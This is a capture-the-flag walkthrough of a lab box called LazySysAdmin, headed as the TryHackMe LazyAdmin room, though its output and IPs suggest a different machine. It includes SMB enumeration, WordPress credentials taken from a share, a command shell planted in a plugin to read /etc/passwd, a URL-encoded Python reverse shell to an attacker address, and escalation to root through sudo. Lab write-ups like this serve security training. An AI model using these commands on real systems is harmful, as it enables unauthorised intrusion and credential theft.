# LazyAdmin TryHackMe Room

> Darshan Patel

## Overview

| Tables | Description |
| ------ | ----------- |
| Challenge Name | LazyAdmin |
| Difficulty | Easy |
| Tags | security, index|

---
```bash
export IP=10.10.28.249
```

Nmap Scan: 
```
nmap -sC -sV -T5 -p- --open -n -v $IP
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
|   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
|_  256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (EdDSA)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Silex v2.2.7
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 4 disallowed entries 
|_/old/ /test/ /TR2/ /Backnode_files/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Backnode
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
| irc-info: 
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.1.66
|_  error: Closing link: (nmap@192.168.1.66) [Client exited]
MAC Address: 08:00:27:85:CA:B0 (Oracle VirtualBox virtual NIC)
Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1m46s, deviation: 0s, median: 1m46s
| nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   LAZYSYSADMIN<00>     Flags: <unique><active>
|   LAZYSYSADMIN<03>     Flags: <unique><active>
|   LAZYSYSADMIN<20>     Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: lazysysadmin
|   NetBIOS computer name: LAZYSYSADMIN\x00
|   Domain name: \x00
|   FQDN: lazysysadmin
|_  System time: 2018-01-01T10:15:45+10:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2017-12-31 19:15:45
|_  start_date: 1600-12-31 19:03:58

```
```
smbmap -u guest -H $IP
[+] Finding open SMB ports....
[+] Guest SMB session established on 192.168.1.85...
[+] IP: 192.168.1.85:445        Name: 192.168.1.85                                      
        Disk                                                    Permissions
        ----                                                    -----------
        print$                                                  NO ACCESS
        share$                                                  READ ONLY
        IPC$                                                    NO ACCESS
```

```
smbmap -u guest -H $IP -R / > smblist.ing.txt
..snip..
	dr--r--r--                0 Sun Dec 31 19:23:39 2017	wordpress
	dr--r--r--                0 Mon Aug 14 08:08:26 2017	Backnode_files
	dr--r--r--                0 Tue Aug 15 06:51:23 2017	wp
	-r--r--r--              139 Mon Aug 14 08:20:05 2017	deets.txt
	-r--r--r--               92 Mon Aug 14 08:36:14 2017	robots.txt
	-r--r--r--               79 Mon Aug 14 08:39:56 2017	todolist.txt
	dr--r--r--                0 Mon Aug 14 08:35:19 2017	apache
	-r--r--r--            36072 Sun Aug  6 01:02:14 2017	index.html
	-r--r--r--               20 Tue Aug 15 06:55:19 2017	info.php
	dr--r--r--                0 Mon Aug 14 08:35:10 2017	test
	dr--r--r--                0 Mon Aug 14 08:35:13 2017	old
..snip..
```

```http://$IP/todolist.txt:```
> Prevent users from being able to view to web root using the local file browser

```http://$IP/deets.txt:```
> CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

```
Password: 12345
```
Re-Scanning the `SMB` port to gether more info: 
```
nmap -v -n -sV --script=smb-enum-shares -p445 $IP
Service Info: Host: LAZYSYSADMIN

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\192.168.1.85\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Web server)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.168.1.85\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|     Current user access: <none>
|   \\192.168.1.85\share$: 
|     Type: STYPE_DISKTREE
|     Comment: Sumshare
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\www\html\
|     Anonymous access: READ/WRITE
|_    Current user access: READ/WRITE
```

We connect locally in our file system with an smb://192.168.1.85 and user anonymous, which has read access to the remote system. We open the wp-config.php file off the wordpress installation and gather the following info:

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'Admin');

/** MySQL database password */
define('DB_PASSWORD', 'TogieMYSQL12345^^');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```

First thing I check is the wp-admin login with "admin" and "TogieMYSQL12345^^" as the password, which works.

We upload a `shell.php.jpg` file via `wordpress`, but does not execute as `PHP`. Moving on, we can just edit any plugins to accomplish much the same thing though.

We use the hello dolly plugin as our target to insert our command shell
`view-source:http://$IP/wordpress/wp-content/plugins/hello.php?cmd=cat%20/etc/passwd`

Contents of `../etc/passwd`: 
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
togie:x:1000:1000:togie,,,:/home/togie:/bin/rbash
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:105:113:MySQL Server,,,:/nonexistent:/bin/false
```

Lets see about getting a reverse shell now.
```
python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22192.168.1.66%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B%27
```
And then an interactive shell upgrade ala: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
tput lines
30
tput cols
129
stty raw -echo
fg
reset
TERM=xterm-256color #anything when it prompts you, then
export TERM=xterm-256color
stty rows 30 columns 129
clear
:)
```

Seeing as we have the password from wordpress, we try reusing it again.
```
su togie > TogieMYSQL12345^^
this did not work. However, the password we found in deets.txt, was 12345, and this IS the correct password.

togie@LazySysAdmin:/var/www/html/wordpress/wp-content/plugins$ id
uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
togie@LazySysAdmin:/var/www/html/wordpress/wp-content/plugins$ 

togie@LazySysAdmin:/var/www/html/wordpress/wp-content/plugins$ sudo -l
[sudo] password for togie: 
Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
togie@LazySysAdmin:/var/www/html/wordpress/wp-content/plugins$ 

togie@LazySysAdmin:/var/www/html/wordpress/wp-content/plugins$ sudo su
root@LazySysAdmin:/var/www/html/wordpress/wp-content/plugins# id
uid=0(root) gid=0(root) groups=0(root)
root@LazySysAdmin:/var/www/html/wordpress/wp-content/plugins# 
```

```
root@LazySysAdmin:/var/www/html/wordpress/wp-content/plugins# cd /root
root@LazySysAdmin:~# ls
proof.txt
root@LazySysAdmin:~# cat proof.txt 
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851

Well done :)

Hope you learn't a few things along the way.

Regards,

Togie Mcdogie
```
### Game over!!!
